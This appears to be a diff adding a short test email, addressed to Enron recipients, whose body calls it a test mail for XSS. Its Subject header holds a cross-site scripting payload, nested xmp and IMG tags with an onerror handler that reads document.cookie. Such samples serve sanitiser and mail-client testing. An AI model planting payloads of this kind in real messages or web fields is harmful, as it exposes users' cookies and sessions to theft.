@@ -1,0 +1,7 @@
+From: "ALDRIDGE AUDREY" <issalppqoeia@email.de>
+To: steve.swain@enron.com, harry.kingerski@enron.com, jennifer.thome@enron.com, 
+Subject: <xmp><IMG src='test.gif&</xmp><IMG onerror=alert(document.cookie) src='><IMG src='><IMG src='test.gif&"">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
